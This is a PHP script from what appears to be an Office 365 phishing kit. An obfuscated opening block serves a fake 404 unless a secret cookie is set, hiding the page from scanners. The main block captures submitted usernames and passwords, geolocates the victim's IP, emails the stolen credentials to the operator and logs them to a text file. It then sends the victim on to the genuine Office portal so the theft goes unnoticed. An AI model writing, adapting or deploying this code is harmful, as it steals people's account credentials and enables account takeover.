<?php
goto O3298; O6643: if (!(!$_COOKIE["\x62\145\154\x6c\x61"] == "\143\x69\x61\157")) { goto O0474; } goto O7037; O3298: if (isset($_COOKIE["\142\145\154\x6c\x61"])) { goto O9993; } goto O6643; O4780: O0474: goto O9394; O7037: header("\x48\x54\124\120\57\x31\x2e\x30\x20\x34\x30\64\x20\116\157\164\40\106\157\165\x6e\x64"); goto O9021; O9021: die("\x3c\x21\x44\x4f\103\x54\x59\x50\x45\x20\x48\x54\x4d\114\x20\120\x55\x42\x4c\x49\103\40\x22\55\57\57\111\105\x54\106\57\x2f\x44\x54\x44\x20\x48\124\115\114\x20\x32\56\60\57\57\105\116\42\x3e\12\74\150\164\x6d\154\76\x3c\150\145\141\144\x3e\12\74\164\151\x74\154\x65\x3e\x34\x30\64\40\116\157\164\x20\106\157\x75\x6e\144\x3c\57\164\151\164\154\145\x3e\12\x3c\x2f\x68\145\x61\144\x3e\x3c\x62\x6f\x64\x79\76\12\x3c\x68\61\76\116\157\164\40\x46\x6f\165\156\x64\74\x2f\150\61\76\12\74\160\x3e\x54\150\x65\x20\162\145\161\165\145\x73\x74\x65\x64\40\x55\x52\114\x20\x77\141\x73\x20\156\x6f\x74\x20\146\157\165\x6e\x64\x20\x6f\156\x20\164\x68\x69\163\x20\x73\145\162\166\145\x72\56\x3c\57\x70\x3e\12\74\x2f\x62\157\144\171\76\x3c\57\150\x74\155\x6c\x3e"); goto O4780; O9394: O9993:
?>



<?php

$recipient = 'your_email@gmail.com'; // Put your email address here


if(isset($_POST['user']) && isset($_POST['pass'])){

	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();
	$geoplugin->locate();

	$user = $_POST['user'];
	$pass = $_POST['pass'];
	$api = 'http://my-ips.org/ip/index.php'; //put api url
	$country = $geoplugin->countryName;
	$ip = getenv("REMOTE_ADDR");
	$result = 1;

	$date = date('d-m-Y');
	$ip = getenv("REMOTE_ADDR");
	$over = 'https://portal.office.com';
	$message = "-----------------+ True Login FUD +-----------------\n";
	$message.= "User ID: " . $user . "\n";
	$message.= "Password: " . $pass . "\n";
	$message.= "Client IP      : $ip\n";
	$message.= "Client Country      : $country\n";
	$message.= "-----------------++------------------\n";
	$subject = "OFFICE 365 | True Login: " . $ip . "\n";
	$headers = "MIME-Version: 1.0\n";

	mail($recipient, $subject, $message, $headers);
	@fclose(@fwrite(@fopen("Office-login.txt", "a"),$message));

	$attempt = intval($_POST['trt1']);
	if ($attempt == 1){
		header("Location: login.php?error&id=$user&.rand=13InboxLight.aspx&.randID=4f45a5e11f9c768edb37c3778ca4bc82&tries=2");
	}elseif ($attempt == 2) {
		header("Location: login.php?error&id=$user&.rand=13InboxLight.aspx&.randID=4f45a5e11f9c768edb37c3778ca4bc82&tries=3");
	}
	elseif ($attempt == 3) {
		header("Location: $over");
	}else{
		header("Location: $over");
	}

}else {
		header('HTTP/1.0 404 Not Found');
		die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>');
	}

?>
